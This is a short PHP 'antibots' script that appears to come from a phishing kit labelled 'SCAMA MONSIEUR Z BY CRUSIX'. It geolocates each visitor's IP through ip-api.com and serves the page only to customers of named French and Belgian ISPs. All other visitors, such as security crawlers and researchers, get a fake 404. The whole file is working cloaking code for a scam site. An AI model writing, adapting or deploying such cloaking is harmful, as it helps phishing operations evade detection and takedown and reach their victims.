<?php
/*
SCAMA MONSIEUR Z
BY CRUSIX
ANTIBOTS.PHP
*/
session_start(); // OUVERTURE DE LA SESSION
$ip = $_SERVER['REMOTE_ADDR'];
function getIpInfo($ip = '') {
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}
    $visitor_ip = $_SERVER['REMOTE_ADDR'];
    $ipinfo_json = getIpInfo($visitor_ip);
	$org = "{$ipinfo_json['as']}";
	$isps = "{$ipinfo_json['isp']}";

if(strpos(strtolower($org),"bouygues") || strpos(strtolower($org),"orange") || strpos(strtolower($org),"sfr") || strpos(strtolower($org),"free") || strpos(strtolower($org),"wanadoo") || strpos(strtolower($org),"proximus") || strpos(strtolower($org),"telenet") || strpos(strtolower($org),"scarlet")  )
{
	

}
else
{

	
	
die('HTTP/1.0 404 Not Found');
	

}
?>
